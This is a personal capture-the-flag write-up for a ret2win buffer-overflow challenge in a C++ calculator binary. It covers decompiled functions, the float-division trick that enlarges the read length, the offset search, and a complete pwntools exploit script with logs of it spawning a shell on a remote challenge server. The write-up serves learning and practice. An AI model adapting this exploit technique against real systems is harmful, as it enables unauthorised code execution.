
#Buffer-overflow #ret2win #easy 

#### tools & techniques:
[[Ropper]] 
[[gdb-pwndbg]]
[[readelf]]



![[test]]

## reflection

This was a fun quick challenge which felt quite simple to solve (it's taken some time to get to that stage!) and I enjoyed the added twist of working out the `setFloatNumber()` function which was a nice complication. I have to navigate another stack alignment problem which I admit I still don't fully understand but I'm sure I will come to understand it properly in time with a little more learning. My main takeaway is that I should probably get used to using more automated tools to debug rather than doing it manually which allows for a lot more user error and is less efficient. I could have written a script to easily find the offset, find the win function address and it probably would have taken me half the time but i'm not yet comfortable with these tools.

```
└─$ file test 
test: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a92d04d9302335674d75fb049a73abdd6fb1e91e, for GNU/Linux 3.2.0, not stripped
```

| RELRO         | STACK CANARY    | NX         | PIE    | Symbols    |
| ------------- | --------------- | ---------- | ------ | ---------- |
| Partial RELRO | No canary found | NX enabled | No PIE | 69 Symbols |

First off - let's decompile using ghidra:

```
main(void)

{
  Calculator local_28 [28];
  int local_c;
  
  local_c = 0;
  Calculator::Calculator(local_28);
  setup();
  do {
    while( true ) {
      banner();
      printf("> ");
      __isoc99_scanf(&DAT_0040207b,&local_c);
      if (local_c != 0x539) break;
      Calculator::Backdoor();
    }
    if (local_c < 0x53a) {
      if (local_c == 1) {
        Calculator::setnumber_floater();
      }
      else if (local_c == 2) {
        Calculator::setnumber_integer();
      }
    }
  } while( true );
}
```

No vulnerabilities so far...we can see though an interesting function `Backdoor()` which can only be reached by entering 0x539 (1337) Let's decompile that.

```
void Calculator::Backdoor(void)

{
  long index;
  long in_RDI;
  undefined8 *puVar1;
  undefined8 local_408;
  undefined8 local_400;
  undefined8 local_3f8 [126];
  
  local_408 = 0;
  local_400 = 0;
  puVar1 = local_3f8;
  for (index = 0x7e; index != 0; index = index + -1) {
    *puVar1 = 0;
    puVar1 = puVar1 + 1;
  }
  if (*(int *)(in_RDI + 0x18) != 0) {
    puts("Create note");
    printf("> ");
    read(0,&local_408,(long)*(int *)(in_RDI + 0x18));
  }
  return;
}
```

Now there is a little more to unpack here. We can see a line - `if rdi + 0x18 != 0`

If true, we can then read the number of bytes in rdi+0x18 into a local_408 which isn't bounds checked, so we can use this to overwrite the return address jump to this hidden below:

```
void win(void)

{
  system("/bin/sh");
  return;
}
```

The last thing is - we've got to find out how to set `rdi+0x18` to be a large enough value to allow enough to overwrite the return value.

Let's checkout the other functions:

```
void Calculator::setnumber_floater(void)

{
  char cVar1;
  long in_RDI;
  
  puts("Floater Calculator");
  printf("> ");
  __isoc99_scanf(&DAT_00402055,in_RDI + 0xc);
  printf("> ");
  __isoc99_scanf(&DAT_00402055,in_RDI + 0x10);
  if ((((0.0 <= *(float *)(in_RDI + 0xc)) && (0.0 <= *(float *)(in_RDI + 0x10))) &&
      (*(float *)(in_RDI + 0xc) <= 10.0)) && (*(float *)(in_RDI + 0x10) <= 10.0)) {
    cVar1 = checkDecimalPlaces(*(float *)(in_RDI + 0xc));
    if (cVar1 != '\x01') {
      *(undefined4 *)(in_RDI + 0xc) = 0x3f800000;
      *(undefined4 *)(in_RDI + 0x10) = 0x3f800000;
    }
    *(float *)(in_RDI + 0x14) = *(float *)(in_RDI + 0xc) / *(float *)(in_RDI + 0x10);
    *(int *)(in_RDI + 0x18) = (int)*(float *)(in_RDI + 0x14);
    if (*(int *)(in_RDI + 0x18) < 0) {
      *(int *)(in_RDI + 0x18) = *(int *)(in_RDI + 0x18) + -1;
    }
    return;
  }
  printf("No Hack");
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```
The above function shows that `rdi + 0x18` is where the integer part of a division of two inputs is stored. We need to divide a number by a sufficiently small number to ensure there are enough bytes available to overwrite the `Backdoor()` return address. Let's use 9 and 0.0000001 as the floats to give us plenty of bytes.

Lastly, we need to calculate the offset of the return address. let's use pwntools for this

`>cyclic 1200`

Inputing this cyclic pattern overwrites the return value with `<0x6661616161616165>`
 `0x4018e5 <Calculator::Backdoor()+153>    ret             <0x6661616161616165>`

using `cyclic -l`
```
pwndbg> cyclic -l 0x6661616161616165
Finding cyclic pattern of 8 bytes: b'eaaaaaaf' (hex: 0x6561616161616166)
Found at offset 1032
```

Let's find the address of `win` function by using `readelf`

```
└─$ readelf -s test | grep "win" 
    59: 0000000000401740    26 FUNC    GLOBAL DEFAULT   15 _Z3winv
    66: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _Unwind_Resume@G[...]
```

Now we can see the address we need to jump to is `0x401740`

#todo 
Unfortunately, there was another stack alignment issue once calling the `system('/bin/sh')` function which was solved by adding another simple ret gadget. I'm still not sure what causes this and why it works but it's something to understand later.

### Putting the script together:

#my-solution 
```
#!/usr/bin/env python3

from pwn import *
# context.log_level = 'debug'

exe = ELF("./test", checksec=False)
context.binary = exe

offset = 1032

win = p64(0x401740)
ret = p64(0x40101a)

# Build the payload
payload = flat(     
        b'a'* offset,
        ret, 
        win                 
)
 

# io = remote('34.134.200.24', 31038)
io = exe.process()
io.sendlineafter(b'>', b'1')
io.sendlineafter(b'>', b'9')
io.sendlineafter(b'>', b'0.0000001')
io.sendlineafter(b'>', b'1337')
print(io.recvline())
print(win)    
# gdb.attach(io)
io.sendlineafter(b'>', payload)
io.interactive()
# io.sendline(b'cat flag.txt')

# print(io.readline().decode())
```


```
└─$ ./exploit.py
[+] Starting local process '/home/kali/Documents/Deadsec 24/Super cpp calculator/test': pid 607357
b' Create note\n'
b'@\x17@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
 $ whoami
kali
$ cat flag.txt
win
```

When used remotely (before server closed down:)

```
─$ ./exploit.py
[+] Opening connection to 34.134.200.24 on port 31038: Done
[DEBUG] Received 0x3b bytes:
    b'Best Calculator\n'
    b'\n'
    b'1. Float Calculator\n'
    b'2. Integer Calculator\n'
[DEBUG] Received 0x2 bytes:
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x15 bytes:
    b'Floater Calculator\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'9\n'
[DEBUG] Received 0x2 bytes:
    b'> '
[DEBUG] Sent 0xa bytes:
    b'0.0000001\n'
[DEBUG] Received 0x3d bytes:
    b'Best Calculator\n'
    b'\n'
    b'1. Float Calculator\n'
    b'2. Integer Calculator\n'
    b'> '
[DEBUG] Sent 0x5 bytes:
    b'1337\n'
[DEBUG] Received 0xe bytes:
    b'Create note\n'
    b'> '
b' Create note\n'
b'@\x17@\x00\x00\x00\x00\x00'
[DEBUG] Sent 0x419 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000400  61 61 61 61  61 61 61 61  1a 10 40 00  00 00 00 00  │aaaa│aaaa│··@·│····│
    00000410  40 17 40 00  00 00 00 00  0a                        │@·@·│····│·│
    00000419
[*] Switching to interactive mode
 $ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x15 bytes:
    b'DEAD{so_ez_pwn_hehe}\n'
DEAD{so_ez_pwn_hehe}

```
